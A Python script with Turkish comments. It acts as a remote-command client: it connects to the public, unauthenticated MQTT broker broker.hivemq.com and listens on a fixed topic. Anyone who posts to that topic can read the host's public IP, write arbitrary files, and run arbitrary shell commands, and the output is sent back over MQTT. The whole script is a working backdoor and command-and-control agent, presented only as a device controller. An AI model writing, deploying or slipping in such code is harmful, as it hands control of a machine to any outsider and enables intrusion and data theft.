import sys
import subprocess

# 1. Gerekli kütüphanenin varlığını kontrol et ve otomatik kur
try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("[+] 'paho-mqtt' kütüphanesi bulunamadı, kuruluyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paho-mqtt"])
    import paho.mqtt.client as mqtt

import re
import urllib.request

# ================= KULLANICI AYARLARI =================
MQTT_BROKER = "broker.hivemq.com"  # İleride kendi host adresinizle değiştirebilirsiniz
MQTT_PORT = 1883
LISTEN_TOPIC = "cihaz/komutlar"
RESPONSE_TOPIC = "cihaz/yanitlar"
# =======================================================

def get_public_ip():
    """Cihazın dış (public/kamusal) IP adresini internet üzerinden sorgular."""
    servisler = [
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ifconfig.me/ip"
    ]
    
    for servis in servisler:
        try:
            req = urllib.request.Request(servis, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                ip = response.read().decode('utf-8').strip()
                if ip:
                    return ip
        except Exception:
            continue
            
    return "Dış IP alınamadı (İnternet bağlantısı yok veya servisler yanıt vermiyor)."

def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        print(f"[+] MQTT Sunucusuna bağlandı. Konu dinleniyor: {LISTEN_TOPIC}")
        client.subscribe(LISTEN_TOPIC)
    else:
        print(f"[-] Bağlantı başarısız, hata kodu: {rc}")

def on_message(client, userdata, msg):
    try:
        payload = msg.payload.decode('utf-8', errors='ignore').strip()
    except Exception as e:
        print(f"[-] Mesaj okuma hatası: {e}")
        return

    print(f"\n[Gelen Mesaj]: {payload}")
    yanit = ""

    # 1. !!IP!! Komutu (Dış/Public IP Döner)
    if payload == "!!IP!!":
        dis_ip = get_public_ip()
        yanit = f"[Dış IP Bilgisi]: {dis_ip}"

    # 2. !!file!!FILENAME!!CONTENT Komutu (Örn: !!file!!test.txt!!Merhaba Dunya)
    elif payload.startswith("!!file!!"):
        match = re.match(r"^!!file!!(.*?)\!\!(.*)$", payload, re.DOTALL)
        if match:
            filename = match.group(1).strip()
            content = match.group(2)
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(content)
                yanit = f"[Dosya]: '{filename}' başarıyla oluşturuldu ve yazıldı."
            except Exception as e:
                yanit = f"[Dosya Hatası]: {str(e)}"
        else:
            yanit = "[Hata]: Dosya formatı geçersiz. Kullanım -> !!file!!dosya.txt!!icerik"

    # 3. !!cmd!!KOMUT Komutu (Örn: !!cmd!!dir veya !!cmd!!ipconfig)
    elif payload.startswith("!!cmd!!"):
        komut = payload[7:].strip()
        if komut:
            try:
                cikti = subprocess.check_output(
                    komut, 
                    shell=True, 
                    stderr=subprocess.STDOUT, 
                    text=True, 
                    encoding='cp1255' if sys.platform == 'win32' else 'utf-8',
                    errors='replace'
                )
                yanit = f"[CMD Çıktısı - '{komut}']:\n{cikti}"
            except subprocess.CalledProcessError as e:
                yanit = f"[CMD Hatası - '{komut}']:\n{e.output}"
            except Exception as e:
                yanit = f"[Sistem Hatası]: {str(e)}"
        else:
            yanit = "[Hata]: CMD komutu boş olamaz."

    # Yanıt varsa MQTT üzerinden gönder
    if yanit:
        client.publish(RESPONSE_TOPIC, yanit)
        print(f"[Yanıt Gönderildi -> {RESPONSE_TOPIC}]:\n{yanit}")

# Client Kurulumu
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.on_message = on_message

print("[+] Sunucuya bağlanılıyor...")
client.connect(MQTT_BROKER, MQTT_PORT, 60)

# Sonsuz döngüde dinlemeye başla
try:
    client.loop_forever()
except KeyboardInterrupt:
    print("\n[-] İstemci kapatıldı.")
    client.disconnect()
